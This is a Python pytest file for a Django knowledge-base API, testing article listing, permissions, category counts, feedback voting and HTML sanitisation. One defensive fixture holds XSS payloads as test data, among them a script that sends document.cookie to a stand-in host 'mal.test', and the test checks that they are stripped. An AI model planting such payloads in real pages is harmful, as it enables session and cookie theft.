"""API da base de conhecimento (GAPS.md, item 5) — leitura interna e feedback.

Conteúdo em si (título, corpo) é sempre criado direto no banco nestes
testes: quem escreve `Article` de verdade é a sincronização
(`test_wordpress_sync.py`), não esta API.
"""

import pytest
from rest_framework.test import APIClient

from apps.accounts.models import InternalRole, User, UserKind
from apps.customers.models import Company, Plan
from apps.knowledge.models import Article, ArticleFeedback

pytestmark = pytest.mark.django_db


@pytest.fixture
def agente(db):
    return User.objects.create_user(
        email="agente@x.test", full_name="Samuel", kind=UserKind.INTERNAL,
        internal_role=InternalRole.AGENT,
    )


@pytest.fixture
def outro_agente(db):
    return User.objects.create_user(
        email="outro@x.test", full_name="Bia", kind=UserKind.INTERNAL,
        internal_role=InternalRole.AGENT,
    )


@pytest.fixture
def ana(db):
    plan = Plan.objects.create(slug="gold", name="Gold")
    acme = Company.objects.create(name="Acme", slug="acme", plan=plan)
    return User.objects.create_user(
        email="ana@acme.test", full_name="Ana", kind=UserKind.CLIENT, company=acme,
    )


@pytest.fixture
def api():
    def _for(user):
        client = APIClient()
        client.force_authenticate(user=user)
        return client
    return _for


@pytest.fixture
def artigo_sla(db):
    return Article.objects.create(
        wp_post_id=1, wp_url="https://x.test/suporte/sla/",
        title="Como funciona o SLA", excerpt="Resumo do SLA",
        body_html="<p>SLA por plano.</p>", category="SLA",
    )


@pytest.fixture
def artigo_frete(db):
    return Article.objects.create(
        wp_post_id=2, wp_url="https://x.test/suporte/frete/",
        title="Configuração de Frete", category="Logística",
    )


@pytest.fixture
def artigo_inativo(db):
    return Article.objects.create(
        wp_post_id=3, wp_url="https://x.test/suporte/velho/",
        title="Artigo despublicado", is_active=False,
    )


class TestListAndPermissions:
    def test_client_reads_it_too(self, api, ana, artigo_sla):
        """A regra ANTIGA era 403 para cliente, de quando o portal não tinha
        Central de Ajuda. Com a tela no portal, o cliente lê o mesmo acervo:
        é texto que a sincronização puxou publicado do WordPress, já aberto
        na web. O que continua fora do alcance dele é o resto do sistema —
        este endpoint só serve artigo."""
        resp = api(ana).get("/api/v1/knowledge/articles/")
        assert resp.status_code == 200
        body = resp.json()
        linhas = body["results"] if isinstance(body, dict) else body
        assert [a["id"] for a in linhas] == [artigo_sla.pk]

    def test_anonymous_still_blocked(self, artigo_sla):
        """Aberto para quem tem conta, não para a internet."""
        assert APIClient().get("/api/v1/knowledge/articles/").status_code in (401, 403)

    def test_agent_lists_only_active_articles(self, api, agente, artigo_sla, artigo_inativo):
        resp = api(agente).get("/api/v1/knowledge/articles/")
        assert resp.status_code == 200
        ids = [a["id"] for a in resp.json()["results"]] if isinstance(
            resp.json(), dict
        ) else [a["id"] for a in resp.json()]
        assert artigo_sla.pk in ids
        assert artigo_inativo.pk not in ids

    def test_category_filter(self, api, agente, artigo_sla, artigo_frete):
        resp = api(agente).get("/api/v1/knowledge/articles/?category=Logística")
        body = resp.json()
        linhas = body["results"] if isinstance(body, dict) else body
        assert [a["id"] for a in linhas] == [artigo_frete.pk]

    def test_search_matches_title(self, api, agente, artigo_sla, artigo_frete):
        resp = api(agente).get("/api/v1/knowledge/articles/?q=frete")
        body = resp.json()
        linhas = body["results"] if isinstance(body, dict) else body
        assert [a["id"] for a in linhas] == [artigo_frete.pk]

    def test_detail_includes_body_and_related(self, api, agente, artigo_sla, artigo_frete):
        # mesma categoria de nenhum outro artigo criado aqui — related vazio
        resp = api(agente).get(f"/api/v1/knowledge/articles/{artigo_sla.pk}/")
        assert resp.status_code == 200
        body = resp.json()
        assert body["body_html"] == "<p>SLA por plano.</p>"
        assert body["related"] == []


class TestFeedback:
    def test_first_vote_creates_feedback(self, api, agente, artigo_sla):
        resp = api(agente).post(
            f"/api/v1/knowledge/articles/{artigo_sla.pk}/feedback/",
            {"helpful": True}, format="json",
        )
        assert resp.status_code == 200
        assert resp.json() == {"helpful_count": 1, "not_helpful_count": 0, "my_feedback": True}
        assert ArticleFeedback.objects.filter(article=artigo_sla, user=agente).count() == 1

    def test_voting_again_updates_instead_of_duplicating(self, api, agente, artigo_sla):
        api(agente).post(
            f"/api/v1/knowledge/articles/{artigo_sla.pk}/feedback/",
            {"helpful": True}, format="json",
        )
        resp = api(agente).post(
            f"/api/v1/knowledge/articles/{artigo_sla.pk}/feedback/",
            {"helpful": False}, format="json",
        )
        assert resp.json() == {"helpful_count": 0, "not_helpful_count": 1, "my_feedback": False}
        assert ArticleFeedback.objects.filter(article=artigo_sla).count() == 1

    def test_counts_aggregate_across_agents(self, api, agente, outro_agente, artigo_sla):
        api(agente).post(
            f"/api/v1/knowledge/articles/{artigo_sla.pk}/feedback/",
            {"helpful": True}, format="json",
        )
        resp = api(outro_agente).post(
            f"/api/v1/knowledge/articles/{artigo_sla.pk}/feedback/",
            {"helpful": True}, format="json",
        )
        assert resp.json()["helpful_count"] == 2

    def test_my_feedback_reflects_only_the_requesting_user(
        self, api, agente, outro_agente, artigo_sla
    ):
        api(agente).post(
            f"/api/v1/knowledge/articles/{artigo_sla.pk}/feedback/",
            {"helpful": True}, format="json",
        )
        resp = api(outro_agente).get(f"/api/v1/knowledge/articles/{artigo_sla.pk}/")
        assert resp.json()["my_feedback"] is None
        assert resp.json()["helpful_count"] == 1


class TestCategories:
    """A navegação por categoria da Central de Ajuda."""

    def test_lists_categories_with_counts(self, api, ana, artigo_sla, artigo_frete):
        Article.objects.create(
            wp_post_id=10, wp_url="https://x.test/suporte/sla-2/",
            title="SLA por plano", category="SLA",
        )
        resp = api(ana).get("/api/v1/knowledge/articles/categories/")
        assert resp.status_code == 200
        assert resp.json() == [
            {"name": "Logística", "count": 1},
            {"name": "SLA", "count": 2},
        ]

    def test_counts_ignore_inactive_and_uncategorized(self, api, agente, artigo_sla):
        Article.objects.create(
            wp_post_id=11, wp_url="https://x.test/a/", title="Despublicado",
            category="SLA", is_active=False,
        )
        Article.objects.create(
            wp_post_id=12, wp_url="https://x.test/b/", title="Sem categoria", category="",
        )
        assert api(agente).get("/api/v1/knowledge/articles/categories/").json() == [
            {"name": "SLA", "count": 1},
        ]


class TestHtmlSanitization:
    """O corpo vem do WordPress e é renderizado no navegador — inclusive no
    portal do cliente. Um WordPress invadido não pode virar execução de
    script na sessão de quem lê o artigo."""

    @pytest.fixture
    def artigo_perigoso(self, db):
        return Article.objects.create(
            wp_post_id=99, wp_url="https://x.test/suporte/x/", title="Artigo",
            body_html=(
                "<p>Texto legítimo</p>"
                "<script>fetch('https://mal.test?c='+document.cookie)</script>"
                '<img src=x onerror="alert(1)">'
                '<a href="javascript:alert(1)">clique</a>'
                '<iframe src="https://mal.test"></iframe>'
            ),
        )

    def test_strips_script_handlers_and_iframes(self, api, ana, artigo_perigoso):
        corpo = api(ana).get(f"/api/v1/knowledge/articles/{artigo_perigoso.pk}/").json()["body_html"]
        assert "<p>Texto legítimo</p>" in corpo
        assert "<script" not in corpo
        assert "onerror" not in corpo
        assert "javascript:" not in corpo
        assert "<iframe" not in corpo

    def test_keeps_formatting_and_hardens_links(self, api, ana, db):
        artigo = Article.objects.create(
            wp_post_id=98, wp_url="https://x.test/suporte/y/", title="Formatado",
            body_html=(
                "<h2>Passo a passo</h2><ul><li><strong>Um</strong></li></ul>"
                '<a href="https://exemplo.test">link</a>'
            ),
        )
        corpo = api(ana).get(f"/api/v1/knowledge/articles/{artigo.pk}/").json()["body_html"]
        assert "<h2>Passo a passo</h2>" in corpo
        assert "<strong>Um</strong>" in corpo
        # link para fora sem `noopener` entrega `window.opener` da aba do portal
        assert 'rel="noopener noreferrer"' in corpo


class TestClientFeedback:
    def test_client_can_vote(self, api, ana, artigo_sla):
        """"Isso ajudou?" é da Central de Ajuda do cliente também — o voto
        dele conta junto com o do agente, um por pessoa."""
        resp = api(ana).post(f"/api/v1/knowledge/articles/{artigo_sla.pk}/feedback/", {"helpful": True})
        assert resp.status_code == 200
        assert resp.json()["helpful_count"] == 1
        assert ArticleFeedback.objects.get(article=artigo_sla, user=ana).helpful is True
